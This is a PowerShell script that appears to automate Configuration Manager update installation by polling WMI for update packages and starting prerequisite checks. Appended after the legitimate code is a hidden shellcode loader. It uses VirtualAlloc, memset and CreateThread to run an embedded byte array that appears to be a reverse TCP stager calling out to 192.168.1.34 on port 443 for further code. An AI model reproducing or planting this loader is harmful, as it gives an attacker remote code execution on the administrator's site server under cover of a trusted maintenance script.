
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Site server where the SMS Provider is installed.")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [string]$SiteServer,

    [parameter(Mandatory=$true, HelpMessage="Specify a Configuration Manager version that should be installed. Valid format is e.g. 1602 or 1606.")]
    [ValidateNotNullOrEmpty()]
    [ValidateScript({$_.Length -eq 4})]
    [string]$Version,

    [parameter(Mandatory=$false, HelpMessage="Specify how many times the script will check if an UpdatePackage is available for installation.")]
    [ValidateNotNullOrEmpty()]
    [int]$AvailabilityCheckCount = 120,

    [parameter(Mandatory=$false, HelpMessage="Specify how many times the script will check if the prerequisite checks has completed for an UpdatePackage.")]
    [ValidateNotNullOrEmpty()]
    [int]$PrerequisiteCheckCount = 120
)
Begin {
    
    try {
        Write-Verbose -Message "Determining Site Code for Site server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose -Message "Site Code: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }
}
Process {
    
    $UpdateCheckCount = 0
    $PrereqCheckCount = 0
    $UpdatePackageAvailibility = $false

    
    $CMUpdatePackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CM_UpdatePackages -ComputerName $SiteServer -Filter "(Name like 'Configuration Manager $($Version)%') AND (UpdateType = 0) AND (State != 196612)" -Verbose:$false
    if (($CMUpdatePackage | Measure-Object).Count -eq 1) {
        do {
            
            $UpdateCheckCount++

            
            Write-Verbose -Message "Configuration Manager Servicing: Attempting to locate Update Package in SMS_CM_UpdatePackages matching 'Configuration Manager $($Version)'"
            $CMUpdatePackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CM_UpdatePackages -ComputerName $SiteServer -Filter "(Name like 'Configuration Manager $($Version)%') AND (UpdateType = 0)" -Verbose:$false

            
            if ($CMUpdatePackage -eq $null) {
                Write-Verbose -Message "Configuration Manager Servicing ($($UpdateCheckCount) / $($AvailabilityCheckCount)): UpdatePackage was not found matching 'Configuration Manager $($Version)', sleeping for 30 seconds"
            }
            else {
                Write-Verbose -Message "Configuration Manager Servicing ($($UpdateCheckCount) / $($AvailabilityCheckCount)): UpdatePackage found, validating if $($CMUpdatePackage.Name.TrimEnd()) is ready for installation"
                switch ($CMUpdatePackage.State) {
                    327682 {
                        Write-Verbose -Message "Configuration Manager Servicing ($($UpdateCheckCount) / $($AvailabilityCheckCount)): UpdatePackage state is Downloading, sleeping for 30 seconds"
                        if ($UpdateCheckCount -eq $AvailabilityCheckCount) {
                            Write-Verbose -Message "Configuration Manager Servicing ($($UpdateCheckCount) / $($AvailabilityCheckCount)): Downloading state detected for longer than $($AvailabilityCheckCount * 30 / 60) minutes, restarting SMS_EXECUTIVE service"
                            if ($PSCmdlet.ShouldProcess("SMS_EXECUTIVE", "Restart")) {
                                Restart-Service -Name "SMS_EXECUTIVE" -Force -Verbose:$false
                            }
                            $UpdateCheckCount = 0
                        }                
                    }
                    262146 {
                        Write-Verbose -Message "Configuration Manager Servicing ($($UpdateCheckCount) / $($AvailabilityCheckCount)): UpdatePackage state is Available, attempting to initiate installation of $($CMUpdatePackage.Name.TrimEnd())"
                        $UpdatePackageAvailibility = $true
                    }
                }
            }

            
            if ($UpdatePackageAvailibility -eq $false) {
                Start-Sleep -Seconds 30
            }
        }
        while ($CMUpdatePackage.State -ne 262146)

        
        Write-Verbose -Message "Configuration Manager Servicing: Starting prerequisite checks for $($CMUpdatePackage.Name.TrimEnd())"
        $CMUpdatePackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CM_UpdatePackages -ComputerName $SiteServer -Filter "(Name like 'Configuration Manager $($Version)%') AND (UpdateType = 0)" -Verbose:$false
        if ($CMUpdatePackage -ne $null) {
            if ($PSCmdlet.ShouldProcess($CMUpdatePackage.Name.TrimEnd(), "Install")) {
                $CMUpdatePackage.UpdatePrereqAndStateFlags(0,2) | Out-Null
            }
        }

        
        do {
            
            $PrereqCheckCount++

            
            if ($PrereqCheckCount -eq $PrerequisiteCheckCount) {
                Write-Verbose -Message "Configuration Manager Servicing ($($PrereqCheckCount) / $($PrerequisiteCheckCount)): Prerequisite checks has been in running state for $($PrerequisiteCheckCount * 30 / 60) min, restarting SMS_EXECUTIVE service"
                if ($PSCmdlet.ShouldProcess("SMS_EXECUTIVE", "Restart")) {
                    Restart-Service -Name "SMS_EXECUTIVE" -Force -Verbose:$false
                }
                $PrereqCheckCount = 0
            }
            else {
                Write-Verbose -Message "Configuration Manager Servicing ($($PrereqCheckCount) / $($PrerequisiteCheckCount)): Waiting for prerequisite checks to complete for $($CMUpdatePackage.Name.TrimEnd()), sleeping for 30 seconds"
                $CMUpdatePackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CM_UpdatePackages -ComputerName $SiteServer -Filter "(Name like 'Configuration Manager $($Version)%') AND (UpdateType = 0)" -Verbose:$false

                
                Start-Sleep -Seconds 30
            }
        }
        while ($CMUpdatePackage.State -ne 196609)

        
        Write-Verbose -Message "Configuration Manager Servicing: Installation was successfully initated for $($CMUpdatePackage.Name.TrimEnd()), for more details, review the CMUpdate.log"        
    }
    elseif (($CMUpdatePackage | Measure-Object).Count -gt 1) {
        Write-Warning -Message "Query for Update Packages returned more than 1 instance, please define your search with a specific version"
    }
    else {
        Write-Warning -Message "Query for Update Packages did not return any instances"
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x22,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

